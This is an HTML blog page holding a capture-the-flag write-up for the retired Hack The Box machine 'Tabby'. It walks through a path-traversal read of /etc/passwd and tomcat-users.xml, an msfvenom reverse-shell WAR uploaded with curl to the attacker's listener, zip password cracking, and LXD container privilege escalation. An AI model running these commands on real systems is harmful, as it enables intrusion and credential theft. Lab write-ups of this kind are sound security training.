
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="triki">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.0.5">
    
    
      
        <title>2020 07 16 tabby - ikirt.github.io</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.a617204b.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.9204c3b2.min.css">
        
          
          
          <meta name="theme-color" content="#00bdd6">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="cyan" data-md-color-accent="yellow">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="ikirt.github.io" class="md-header__button md-logo" aria-label="ikirt.github.io" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            ikirt.github.io
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              2020 07 16 tabby
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="ikirt.github.io" class="md-nav__button md-logo" aria-label="ikirt.github.io" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    ikirt.github.io
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        About
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          3D
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="3D" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          3D
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3D/2021-04-06-my-haribo/" class="md-nav__link">
        3D printing
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3D/TMC5160/" class="md-nav__link">
        TMC5160
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3D/mks-genv14/" class="md-nav__link">
        MKS Gen v1.4
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3D/skrv14/" class="md-nav__link">
        SKR v1.4 Turbo
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../3D/tmc2209/" class="md-nav__link">
        TMC2209
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          HTB
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HTB" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          HTB
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2019-10-20-postman/" class="md-nav__link">
        2019 10 20 postman
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2019-11-10-traverxec/" class="md-nav__link">
        2019 11 10 traverxec
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2020-03-18-traceback/" class="md-nav__link">
        2020 03 18 traceback
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2020-06-16-htb-oh-my-zsh-theme/" class="md-nav__link">
        2020 06 16 htb oh my zsh theme
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2020-07-12-blunder/" class="md-nav__link">
        2020 07 12 blunder
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
      <a href="./" class="md-nav__link md-nav__link--active">
        2020 07 16 tabby
      </a>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2020-07-19-admirer/" class="md-nav__link">
        2020 07 19 admirer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2020-08-05-buff/" class="md-nav__link">
        2020 08 05 buff
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2020-09-10-doctor/" class="md-nav__link">
        2020 09 10 doctor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2020-09-20-omni/" class="md-nav__link">
        2020 09 20 omni
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2020-12-16-academy/" class="md-nav__link">
        2020 12 16 academy
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2021-03-22-scriptkiddie/" class="md-nav__link">
        2021 03 22 scriptkiddie
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2021-05-07-spectra/" class="md-nav__link">
        2021 05 07 spectra
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2021-06-20-backdoor/" class="md-nav__link">
        2021 06 20 backdoor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2021-07-05-bountyhunter/" class="md-nav__link">
        2021 07 05 bountyhunter
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2021-07-20-explore/" class="md-nav__link">
        2021 07 20 explore
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2021-08-05-previse/" class="md-nav__link">
        2021 08 05 previse
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Hackerone
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Hackerone" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Hackerone
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hackerone/2020-04-08-petshop-pro/" class="md-nav__link">
        PetShop Pro Write-up
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hackerone/2020-04-08-thermostat/" class="md-nav__link">
        H1 Thermostat Write-up
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          iOS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="iOS" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          iOS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../iOS/2022-02-11-Ipad2-jailbreak/" class="md-nav__link">
        Ipad 2 Jailbreak
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../iOS/2022-03-12-hackintosh/" class="md-nav__link">
        Hackintosh
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Mc
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Mc" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Mc
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../mc/2020-04-19-esp32-presence-ha/" class="md-nav__link">
        ESP32 BLE Room Presence with HomeAssistant
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../mc/2022-01-05-NodeMCU_wifi_deauth_detection/" class="md-nav__link">
        Wifi Deauth Dectection with NodeMCU
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                

  <h1>2020 07 16 tabby</h1>

<p><img alt="MainPage" src="/images/tabby/logo.png" style="height:377px;width:595px" /></p>
<p>Tabby was just retired, here is my write-up on how I worked my way through this box.</p>
<p>Enumerating the ports on the host, I see the following:</p>
<div class="highlight"><pre><span></span><code>PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div>
<p>Browing to the host on port 80 I see:</p>
<p><img alt="MainPage" src="/images/tabby/tabby-port-80.png" /></p>
<p>Looks like this site was already hacked and something was patched.</p>
<p><img alt="NewsPage" src="/images/tabby/tabby-news-page.png" /></p>
<p>Checking port 8080 I am presented with this:</p>
<p><img alt="NewsPage" src="/images/tabby/tabby-port-8080.png" /></p>
<p>Browsing to  http://10.10.10.194:8080/manager/html and http://10.10.10.194:8080/host-manager/html, I am prompt for a password</p>
<p>Not knowing what these are for I read the documentation on Tomcat's site to find out these are management GUIs to allow developers to create mutliple web projects and manage them individually. Ok, this attack vector is going to be web based. Testing default tomcat accounts failed, so I went to google to see if there are any recent vulnerabilities. After a couple minutes I came across <strong>ghostcat</strong>, which leverages LFI.</p>
<p>Testing some paths to see if I can read the <strong>/etc/passwd</strong>, I am successfull with the following:</p>
<div class="highlight"><pre><span></span><code>http://megahosting.htb/news.php?file=../../../../etc/passwd
</code></pre></div>
<p><img alt="NewsPage" src="/images/tabby/tabby-lfi-passwd.png" /></p>
<p>Well, well, now I have a user to hunt for <strong>ash</strong> for password.</p>
<p>If anyone is interested there is a tool to help test for LFI, https://github.com/chrispetrou/FDsploit</p>
<p>Now,<em> I need to find a file on the tomcat server to hold some credentials. Not knowing what I need, I decided to install tomcat locally on my box to see what the config files called and located. After installing I see tomcat is called </em><em>/usr/local/tomcat9/</em><em> and there is a config file here </em><em>/usr/local/tomcat9/etc/tomcat-users/xml</em><em> that hosts the username and password for the </em><em>host-manager</em>* page.</p>
<p>So, seeing how many subfolders I had to traverse to get to <strong>/etc/passwd</strong>, I decided to try this URL out.
<div class="highlight"><pre><span></span><code>http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
</code></pre></div></p>
<p>Pages loads, but I get a blank page, but if I check source code(CTRL-U) I see this:</p>
<p><img alt="NewsPage" src="/images/tabby/tabby-tomcat-users.png" /></p>
<p>Testing the username and password found, lets me into the <strong>tomcat host-manager</strong></p>
<p><img alt="NewsPage" src="/images/tabby/tabby-tomcat-admin-panel.png" /></p>
<p>Searching google for waying to exploit  <strong>tomcat host-manager</strong>, I came across this article, https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/. This page explains how to use impacket smbserver to host files on attacking smb server and tomcat would load the file remotely. I could not get this to load on this instance. So building on that, I found out that tomcat user role manager-script grants access to an API for scripting. Further digging I found I can you a curl command to upload a file to tomcat host-manager, list the instances host on tomcat.</p>
<p>tomcat documentation, https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Supported_Manager_Commands</p>
<p>Now I need a war file, <strong>msfvenom</strong> can help out here.
<div class="highlight"><pre><span></span><code>╭─[us-vip-7]-[10.10.14.44]-[triki@parrot]-[~]
╰─ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.44 LPORT=4444 -f war &gt; shell.war
</code></pre></div></p>
<p>Now I will upload the war file.</p>
<div class="highlight"><pre><span></span><code>╭─[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/tabby/results/10.10.10.194/exploit/tomcat]
╰─ $ curl --upload-file shell.war &#39;http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/demo&#39;
OK - Deployed application at context path [/demo]


checking to see what is running on Tomcat

╭─[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/tabby/results/10.10.10.194/exploit/tomcat]
╰─ $ curl &#39;http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/list&#39;             
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/shell.war:running:0:shell.war
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/demo:running:0:demo
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
</code></pre></div>
<p>Looking at the output I see that my war file path is /demo, so going to <strong>http://10.10.10.194/demo</strong> should call home, so I need to make sure I have my listener active on the correct port I set in the war file reverse shell.</p>
<div class="highlight"><pre><span></span><code>╭─[us-vip-7]-[10.10.14.44]-[triki@parrot]-[~] master
╰─[☢] $ nc -nvlp 4444           
Listening on 0.0.0.0 4444
Connection received on 10.10.10.194 51216
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
whoami
tomcat
pwd
/var/lib/tomcat9
env
USER=tomcat
HOME=/opt/tomcat
OLDPWD=/
CATALINA_HOME=/usr/share/tomcat9
LOGNAME=tomcat
JOURNAL_STREAM=9:24596
CACHE_DIRECTORY=/var/cache/tomcat9
JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
CATALINA_TMPDIR=/tmp
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=2349bff0fcac437f9d11fb1922179e7f
JAVA_OPTS=-Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
LANG=en_US.UTF-8
PWD=/var/lib/tomcat9
JAVA_HOME=/usr/lib/jvm/default-java
CATALINA_BASE=/var/lib/tomcat9
whereis python
python: /usr/bin/python3.8 /usr/lib/python2.7 /usr/lib/python3.8 /etc/python3.8 /usr/local/lib/python3.8
python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
tomcat@tabby:/var/lib/tomcat9$  
</code></pre></div>
<p>FOOTHOLD, Now I'm in. Lately I have been playing with LinPeas and I really like it, the output it really easy to sift through. So first thing I do is copy that to a safe location on the box(/dev/shm) with wget. </p>
<p><img alt="NewsPage" src="/images/tabby/tabby-linpeas.png" /></p>
<p>Going through the contents I notice something interesting.</p>
<div class="highlight"><pre><span></span><code>[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/dev/shm/linpeas.sh
/dev/shm/tabby-ash.linpeas
/home/ash
/run/lock
/run/screen
/run/user/1000
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/gnupg
/run/user/1000/inaccessible
/run/user/1000/systemd
/run/user/1000/systemd/units
/snap/core18/1705/run/lock
/snap/core18/1705/tmp
/snap/core18/1705/var/tmp
/tmp
/tmp/alpine-v3.12-x86_64-20200716_0241.tar.gz.1
/tmp/somethin.tar.gz
/tmp/tmux-1000
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/html/files
/var/www/html/files/16162020_backup.zip
</code></pre></div>
<p>Two files jump out at me, <strong>/tmp/alpine-v3.12-x86_64-20200716_0241.tar.gz.1</strong>, <strong>/tmp/somethin.tar.gz</strong> and <strong>/var/www/html/files/16162020_backup.zip</strong>. Copying the files to my local machine I noticed that the file <strong>/tmp/somethin.tar.gz</strong> was just a text file with the results from downloading the alpine image from another host.</p>
<div class="highlight"><pre><span></span><code>--2020-07-15 21:38:17--  http://10.10.14.26:8000/alpine-v3.12-x86_64-20200716_0241.tar.gz
Connecting to 10.10.14.26:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3216907 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200716_0241.tar.gz.1’

     0K .......... .......... .......... .......... ..........  1% 63.3K 49s
    50K .......... .......... .......... .......... ..........  3%  123K 36s
   100K .......... .......... .......... .......... ..........  4%  161K 30s
        ....
  3050K .......... .......... .......... .......... .......... 98%  304K 0s
  3100K .......... .......... .......... .......... .         100%  319K=14s

2020-07-15 21:38:32 (222 KB/s) - ‘alpine-v3.12-x86_64-20200716_0241.tar.gz.1’ saved [3216907/3216907]
</code></pre></div>
<p>On to the next file, <strong>/var/www/html/files/16162020_backup.zip</strong>, trying to extract it asks for a password. Let me see if I can crack it.
<div class="highlight"><pre><span></span><code>╭─[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/tabby/results/10.10.10.194/loot]
╰─[☢] $ fcrackzip -u -D -p &#39;/usr/share/wordlists/rockyou.txt&#39; 16162020_backup.zip 

PASSWORD FOUND!!!!: pw == admin@it
</code></pre></div></p>
<p>Earlier I found a username <strong>ash</strong> with the <strong>Tomcat LFI</strong> attack, lets see if this is the password to that account.</p>
<div class="highlight"><pre><span></span><code>tomcat@tabby:/var$ su ash
Password: admin@it
ash@tabby:~$ cat user.txt
457ea7bda5883c31bdeb8dcb7a90c017
</code></pre></div>
<p>Yup, password works and I got the <strong>user</strong> flag.</p>
<p>Time to work on the privilege escalation...</p>
<p>Looking back at the files I found earlier, I remember the alpine image that was left. Googling for LXD exploit, I found this, https://www.exploit-db.com/exploits/46978</p>
<div class="highlight"><pre><span></span><code># Step 1: Download build-alpine =&gt; wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine =&gt; bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine
</code></pre></div>
<p>Step 2:</p>
<p><img alt="NewsPage" src="/images/tabby/tabby-lxd-image-create-1.png" />
<img alt="NewsPage" src="/images/tabby/tabby-lxd-image-create-2.png" /></p>
<p>Now I copy the alpine image I created to the victim server.</p>
<p>Step 3:</p>
<p><img alt="NewsPage" src="/images/tabby/tabby-root-exploit-1.png" /></p>
<p>Step 4:</p>
<p><img alt="NewsPage" src="/images/tabby/tabby-root-exploit-2.png" /></p>
<p>ROOTED</p>

  <hr>
<div class="md-source-file">
  <small>
    
      Last update:
      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">January 28, 2022</span>
      
    
  </small>
</div>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../2020-07-12-blunder/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 2020 07 12 blunder" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              2020 07 12 blunder
            </div>
          </div>
        </a>
      
      
        
        <a href="../2020-07-19-admirer/" class="md-footer__link md-footer__link--next" aria-label="Next: 2020 07 19 admirer" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              2020 07 19 admirer
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.annotate"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.cefbb252.min.js"}</script>
    
    
      <script src="../../assets/javascripts/bundle.a5f8ea78.min.js"></script>
      
    
  </body>
</html>